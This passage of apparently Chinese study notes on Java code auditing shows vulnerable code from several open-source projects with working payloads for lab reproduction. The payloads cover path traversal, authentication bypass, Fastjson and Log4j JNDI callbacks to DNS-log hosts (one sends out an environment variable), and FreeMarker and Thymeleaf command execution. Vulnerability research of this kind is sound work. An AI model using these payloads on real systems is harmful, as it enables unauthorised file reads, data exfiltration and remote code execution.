HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 获取本地资源存储的基础路径（例如：D:/upload/）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <br>    <span class="hljs-comment">// 从resource参数中截取资源相对路径，并拼接成完整物理路径</span><br>    <span class="hljs-comment">// 例如：resource=&quot;profile/xxx.jpg&quot; → 截取后变成&quot;/xxx.jpg&quot; → 最终路径&quot;D:/upload/xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <br>    <span class="hljs-comment">// 从完整路径中提取文件名（最后一个/后的内容）</span><br>    <span class="hljs-comment">// 例如：&quot;D:/upload/xxx.jpg&quot; → &quot;xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">// 设置响应内容类型为二进制流（强制浏览器下载而不是直接打开）</span><br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    <br>    <span class="hljs-comment">// 设置响应头，指定下载文件名（解决中文乱码等问题）</span><br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>    <span class="hljs-comment">// 将文件内容写入响应输出流（实现下载）</span><br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure><p>localPath是开发人员自己设置的源代码路径，发现没有过滤..&#x2F;</p></li><li><p>构造payload(实战中要猜测文件所处的位置，文件夹名称)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8088//common/download/resource?resource=/profile/../RuoYi-v4.5.0/ruoyi-admin/src/main/resources/application-druid.yml<br></code></pre></td></tr></table></figure></li><li><p>在v4.6.0版本中的同样位置找到新版本修复了此漏洞，过滤了..&#x2F;，多了检测规则</p></li></ul><h4 id="oa-system-master案例-文件读取"><a href="#oa-system-master案例-文件读取" class="headerlink" title="oa-system-master案例(文件读取)"></a>oa-system-master案例(文件读取)</h4><ul><li><p>搜索关键字FileInputStream</p><p>找到一段相关代码，开始审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;//**&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> /(Model model, HttpServletResponse response, <span class="hljs-meta">@SessionAttribute(&quot;userId&quot;)</span> Long userId, HttpServletRequest request)<br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">projectPath</span> <span class="hljs-operator">=</span> ClassUtils.getDefaultClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();<br>System.out.println(projectPath);<br><span class="hljs-type">String</span> <span class="hljs-variable">startpath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(URLDecoder.decode(request.getRequestURI(), <span class="hljs-string">&quot;utf-8&quot;</span>));<br><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> startpath.replace(<span class="hljs-string">&quot;//&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(rootpath, path);<br><br><span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">sos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(f.getPath());<br><span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) f.length()];<br>IOUtils.readFully(input, data);<br><span class="hljs-comment">// 将文件流输出到浏览器</span><br>IOUtils.write(data, sos);<br>input.close();<br>sos.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</p></li><li><p>打印出每个过程参数的值逐个分析</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A113.png"></p></li><li><p>发现传入的值是rootpath与path的值的拼接</p></li><li><p>构造payload：</p><ul><li><p>同样是使用..&#x2F;跳到上一级的原理</p></li><li><pre><code class="language-url">/////..///..///..///..///..//1.txt<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - 根据源代码，<span class="hljs-comment">//会被替换为空</span><br><br>  - 只有url中加上<span class="hljs-comment">//才能正常执行，具体原因未知</span><br><br><span class="hljs-meta">### 鉴权 未授权访问</span><br><br>[<span class="hljs-meta">Java代码审计&amp;鉴权漏洞&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_java鉴权-CSDN博客</span>](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> 过滤器               -- 逻辑安全问题<br><span class="hljs-number">2.</span> 自定义代码       -- 逻辑安全问题<br><span class="hljs-number">3.</span> shiro框架验证  -- 找shiro版本漏洞<br><br>- 鉴权使用的框架，拦截器，过滤器等<br><br>  ![](/img/java审计/java审计<span class="hljs-number">14.</span>png)<br>  <br>  拦截器一般流程<br>  <br>  ![](/img/java审计/java审计<span class="hljs-number">15.</span>png)<br><br><span class="hljs-meta">#### 挖掘点</span><br><br><span class="hljs-number">1.</span> 拦截器中是否鉴权<br><span class="hljs-number">2.</span> 过滤器中是否鉴权<br><span class="hljs-number">3.</span> Shiro版本及其逻辑配置<br><span class="hljs-number">4.</span> 有无JWT<br><span class="hljs-number">5.</span> 以上都没有，查找是否是自写代码鉴权<br><br><span class="hljs-meta">#### Newbee案例(拦截器)</span><br><br>- 确定鉴权使用的是哪种模式<br>  - 在pom.xml文件中搜索jwt和shiro关键字，发现并没有这两种依赖的导入<br>  - 继续通过翻看目录确定是过滤器还是拦截器<br>  - 翻看过程中发现有intercepetor目录<br>  <br>- 确定使用拦截器鉴权<br><br>- 拦截器鉴权一般写在preHandle方法内<br><br>  ```<span class="hljs-function">java</span><br><span class="hljs-function">  <span class="hljs-keyword">public</span> boolean <span class="hljs-title">preHandle</span>(<span class="hljs-params">HttpServletRequest request, HttpServletResponse response, Object o</span>) throws Exception</span> &#123;<br>      <span class="hljs-comment">// 获取当前请求的路径</span><br>      String requestServletPath = request.getServletPath();<br>      <br>      <span class="hljs-comment">// 检查请求路径是否以&quot;/admin&quot;开头且会话中没有&quot;loginUser&quot;属性（即用户未登录）</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.startsWith(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.getSession().getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// 设置错误消息到会话中</span><br>          request.getSession().setAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;请登陆&quot;</span>);<br>          <span class="hljs-comment">// 重定向到管理员登录页面</span><br>          response.sendRedirect(request.getContextPath() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// 返回false表示中断请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 如果已登录或非admin路径请求，则清除可能的错误消息</span><br>          request.getSession().removeAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// 返回true允许请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>核心判断语句requestServletPath.startsWith(“&#x2F;admin”) &amp;&amp; null </p><p>路径开头以admin开头，并且session中loginUser为null</p></li><li><p>利用方式：构造路径为&#x2F;;&#x2F;admin或&#x2F;&#x2F;admin后访问</p></li><li><p>实操发现页面显示404，猜测是与浏览器有关</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A116.png"></p></li></ul><h4 id="华夏ERP案例-过滤器"><a href="#华夏ERP案例-过滤器" class="headerlink" title="华夏ERP案例(过滤器)"></a>华夏ERP案例(过滤器)</h4><ul><li><p>同样在依赖中先搜索jwt和shiro关键字，发现没有</p></li><li><p>翻找目录看到filter目录，发现是过滤器设置</p></li><li><p>过滤器核心代码在doFilter方法内</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>    <span class="hljs-comment">// 1. 将 ServletRequest/ServletResponse 转换为 HttpServletRequest/HttpServletResponse</span><br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <br>    <span class="hljs-comment">// 2. 获取当前请求的 URL</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>    <br>    <span class="hljs-comment">// 3. 检查用户是否已登录（session 中是否有 &quot;user&quot; 属性）</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>    <br>    <span class="hljs-comment">// 4. 如果用户已登录，直接放行请求</span><br>    <span class="hljs-keyword">if</span> (userInfo != <span class="hljs-literal">null</span>) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 5. 如果请求的是登录页（/login.html）或注册页（/register.html），直接放行</span><br>    <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>))) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 6. 检查请求是否在忽略列表（ignoredList）中，如果是则放行</span><br>    <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>        chain.doFilter(servletRequest, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 7. 检查请求是否在白名单（allowUrls）中，如果是则放行</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>            <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                chain.doFilter(request, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 8. 如果以上条件都不满足，说明用户未登录且访问的是受保护资源，重定向到登录页</span><br>    servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用白名单过滤绕过鉴权</p></li><li><p>抓包，在数据包url处更改</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A117.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">/login.html/../account/getAccount     =  /account/getAccount <br>/register.html/../account/getAccount  =  /account/getAccount <br>/a.js/../account/getAccount           =  /account/getAccount  <br>/user/login/../../account/getAccount  =  /account/getAccount <br></code></pre></td></tr></table></figure></li></ul><h4 id="Tumo案例-Shiro"><a href="#Tumo案例-Shiro" class="headerlink" title="Tumo案例(Shiro)"></a>Tumo案例(Shiro)</h4><ul><li><p>同样先在依赖中搜索关键字，发现此源代码使用了shiro框架</p></li><li><p>查看版本，查找资料判断是否有权限绕过漏洞</p></li><li><p>查看目录找到shiro配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">tumo.shiro.anon_url=\<br>  /login,/logout,/register,\<br>  /,/about,/p<span class="hljs-comment">/**,/links,/comment/**,/link/list,/article/list,\</span><br><span class="hljs-comment">  /css/**,/js/**,///**</span><br></code></pre></td></tr></table></figure><p>anon代表可以匿名访问(无需登录)</p></li><li><p>寻找url后带有&#x2F;**的，可以利用它访问到其他地址</p></li></ul><h4 id="FastCMS案例-JWT鉴权"><a href="#FastCMS案例-JWT鉴权" class="headerlink" title="FastCMS案例(JWT鉴权)"></a>FastCMS案例(JWT鉴权)</h4><ul><li><p>Jwt技术鉴权</p><ul><li>生成时使用空加密（逻辑代码问题）</li><li>服务端未校验签名（逻辑代码问题）</li><li>密钥默认未被修改（搭建后未修改）</li><li>密钥爆破可能性大（密钥过于简单）</li></ul></li><li><p>开始审计</p></li><li><p>搜索关键字jwt发现有包引用</p><p>或：数据包中存在jwt特征：两个点将token分解为三段</p></li><li><p>检查密钥是否修改</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A118.png"></p></li><li><p>越权实例：<a href="https://www.cnblogs.com/thebeastofwar/p/17920565.html">Nacos漏洞复现总结 - BattleofZhongDinghe - 博客园 (cnblogs.com)</a></p></li></ul><h3 id="第三方组件漏洞利用"><a href="#第三方组件漏洞利用" class="headerlink" title="第三方组件漏洞利用"></a>第三方组件漏洞利用</h3><ul><li>找存在的第三方组件(Package Checker插件)</li><li>找组件利用入口条件(根据网上已知漏洞复现条件)</li><li>找可控地方测试检测(根据网上已知漏洞利用条件)</li></ul><h4 id="Tmall案例-Fastjson"><a href="#Tmall案例-Fastjson" class="headerlink" title="Tmall案例(Fastjson)"></a>Tmall案例(Fastjson)</h4><ul><li><p>在pom.xml文件中找到FastJson的依赖项，其版本为1.2.58</p></li><li><p>漏洞触发函数   JSON.parseObject()    JSON.parse()</p><ul><li><code>JSON.parseObject()</code> 是 FastJSON 的核心方法，用于 JSON → Java 对象的转换。</li><li>比 <code>JSON.parse()</code>（返回 <code>Object</code>）更常用，因为它可以直接指定目标类型。</li></ul></li><li><p>全局搜索关键字后，继续寻找有可控变量的地方，才有利用点</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A119.png"></p><p>找到此代码并且发现此变量可控，确定此处为漏洞触发点</p></li><li><p>搭建好环境后通过代码可以判断漏洞利用点在添加商品功能处</p></li><li><p>抓取数据包，将propertyJson参数更改为poc</p><p>参考文章：<a href="https://blog.csdn.net/liguangyao213/article/details/123929296">Fastjson反序列化审计及验证_fastjson 1.2.58漏洞-CSDN博客</a></p><p>使用dns平台：{“@type”:”java.net.Inet4Address”,”val”:”3042zb.dnslog.cn”}</p><p>在实操过程中有500报错</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A120.png"></p><p>原因</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A121.png"></p><p>视频演示时可以收到访问请求</p><p>后续查看时发现bp自带的测试地址收到了访问请求</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A122.png"></p></li></ul><h4 id="Tmall-Log4j-2-10-0"><a href="#Tmall-Log4j-2-10-0" class="headerlink" title="Tmall-Log4j   2.10.0"></a>Tmall-Log4j   2.10.0</h4><ul><li><p>log4j漏洞原理</p><p><a href="https://www.freebuf.com/articles/web/364311.html">一文读懂面试官都在问的Log4J2漏洞 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895">log4j漏洞成因和原理（JNDI和LDAP）_，8849。com-CSDN博客</a></p><p> Apache log4j2-RCE 漏洞是由于Log4j2提供的lookup功能下的Jndi &#x3D;&#x3D;Lookup&#x3D;&#x3D;模块出现问题所导致的，&#x3D;&#x3D;该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。&#x3D;&#x3D;</p></li><li><p>搜索关键字(触发点) ：logger.error  logger.info</p></li><li><p>在诸多结果中寻找带有可控变量的</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A123.png"></p><p>可以通过更改图片上传的文件名更改参数值</p></li><li><p>利用jndi注入</p><p><a href="https://xz.aliyun.com/news/11723">JNDI注入原理及利用考究-先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/csd_ct/article/details/122916620">log4j漏洞分析及总结_log4j漏洞是什么-CSDN博客</a></p></li><li><p>上传管理员头像图片后抓包，更改文件名为poc</p><p>filename&#x3D;”${jndi:ldap:&#x2F;&#x2F;${env:OS}.7ffb7b28.log.dnslog.sbs}”</p></li><li><p>jndi注入工具：【JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar】</p></li></ul><h4 id="RuoYi-v4-2-0-shiro漏洞利用"><a href="#RuoYi-v4-2-0-shiro漏洞利用" class="headerlink" title="RuoYi-v4.2.0(shiro漏洞利用)"></a>RuoYi-v4.2.0(shiro漏洞利用)</h4><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><ul><li><p>搜索关键字查找shiro依赖项，查看版本号 1.4.2</p></li><li><p>找到漏洞利用文章</p></li><li><p>在源代码中直接查找key</p><ul><li><p>搜索关键字setCipherKey，找到shiro密钥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A124.png"></p></li></ul></li><li><p>在实战中利用工具爆破密钥，学习反序列化后选择某条攻击链，实现RCE</p></li><li><p>shiro反序列化工具：<a href="https://github.com/Ares-X/shiro-exploit">GitHub - Ares-X&#x2F;shiro-exploit: Shiro反序列化利用工具，支持新版本(AES-GCM)Shiro的key爆破，配合ysoserial，生成回显Payload</a></p></li></ul><h5 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h5><p><a href="https://www.freebuf.com/vuls/231909.html">Shiro权限绕过漏洞分析（CVE-2020-1957） - FreeBuf网络安全行业门户</a></p><ul><li><p>shiro的一般规则</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A125.png"></p></li><li><p>找到ShiroConfig.java文件查看允许匿名访问的目录</p></li><li><p>根据文章构造poc测试</p></li></ul><h4 id="Halo-H2Database"><a href="#Halo-H2Database" class="headerlink" title="Halo(H2Database)"></a>Halo(H2Database)</h4><p><a href="https://www.cnblogs.com/ArcherCY/p/17699288.html">H2 database漏洞复现 - Running_J - 博客园 (cnblogs.com)</a></p><ul><li><p>搭建好环境进入后台</p></li><li><p>访问页面<a href="http://localhost:8090/h2-console">http://localhost:8090/h2-console</a></p></li><li><p>利用jndi注入工具生成poc</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A126.png"></p></li><li><p>传值</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A127.png"></p><p>javax.naming.InitialContext</p><p>注入使用的poc</p></li><li><p>实操并未弹出计算器，猜测是jdk版本过高</p></li><li><p>此漏洞利用要求：H2 database自带的web管理页面允许外部用户访问web管理界面，且不经过身份验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这个就是设置启用还是禁用web管理界面</span><br>spring.h2.console.enabled=<span class="hljs-literal">true</span><br><span class="hljs-comment">//这个就是设置是否允许外部用户进行访问管理界面，并不通过身份验证</span><br>spring.h2.console.settings.web-allow-others=<span class="hljs-literal">true</span><br>如果这两个设置钧开启，那么就可以利用jndi进行注入攻击。<br></code></pre></td></tr></table></figure></li></ul><h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><ol><li>找项目中是否存在模板引擎(类型及安全问题)</li><li>找模板注入利用入口条件</li><li>找可控地方进行测试检测</li></ol><ul><li><p>常见模板引擎</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A128.png"></p></li></ul><h4 id="Halo案例-FreeMarker模板"><a href="#Halo案例-FreeMarker模板" class="headerlink" title="Halo案例(FreeMarker模板)"></a>Halo案例(FreeMarker模板)</h4><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p><ul><li><p>全局搜索关键字freemarker,发现源代码中有freemarker的配置</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A129.png"></p><p>发现FreeMarker的配置文件是 .ftl后缀   </p></li><li><p>修改resources\templates\themes\anatole\index.ftl文件</p><p>加入poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;<br>或<br>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;test(&quot;calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>运行此容器，打开首页发现有计算机弹出，执行了系统命令</p></li><li><p>漏洞利用</p><ul><li>找到模板文件中可控变量，写入poc</li></ul></li><li><p>此源代码没有利用入口</p></li></ul><h4 id="RuoYi-v4-6-0案例-Thymeleaf"><a href="#RuoYi-v4-6-0案例-Thymeleaf" class="headerlink" title="RuoYi-v4.6.0案例(Thymeleaf)"></a>RuoYi-v4.6.0案例(Thymeleaf)</h4><p><a href="https://xz.aliyun.com/news/9281">Thymeleaf Fragment 注入漏洞复现及新姿势扩展-先知社区 (aliyun.com)</a></p><ul><li><p>搜索关键字发现是Thymeleaf模板</p></li><li><p>找入口(寻找与文章中类似的return入口)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A130.png"></p><p>存在可控变量的return入口</p></li><li><p>找到路由 </p><p><a href="http://localhost:8088/monitor/cache">http://localhost:8088/monitor/cache</a></p></li><li><p>抓取数据包后更改变量fragment的值，传入payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A131.png"></p><p>成功弹出计算器</p></li></ul><h3 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h3><p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">微信公众平台 (qq.com)</a></p><p><a href="https://xz.aliyun.com/news/12174#toc-16">https://xz.aliyun.com/news/12174#toc-16</a> (Java反序列化之FastJson反序列化及绕过)</p><p><a href="https://www.ddosi.org/fastjson-payload/#Fastjson_1222-1224">Fastjson漏洞利用姿势技巧集合 | Fastjson payload - 🔰雨苁ℒ🔰 (ddosi.org)</a></p><h4 id="fastjson反序列化漏洞原理"><a href="#fastjson反序列化漏洞原理" class="headerlink" title="fastjson反序列化漏洞原理"></a>fastjson反序列化漏洞原理</h4><ul><li><p>使用AutoType功能进行序列化的JSON字符会带有一个@type来标记其字符的原始类型</p></li><li><p>在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的set或者get方法</p></li><li><p>@type的类有可能被恶意构造，构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p></li><li><p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！因此整个漏洞复现的原理过程就是：</p><ol><li>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。</li><li>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令</li><li>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）</li><li>rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。</li></ol></li></ul><h4 id="Jndi注入原理"><a href="#Jndi注入原理" class="headerlink" title="Jndi注入原理"></a>Jndi注入原理</h4><ul><li><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p></li><li><p>JNDI 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p></li></ul><h4 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h4><h5 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h5><ul><li><p>FastjsonController</p><figure class="highlight java"><table><tr><td 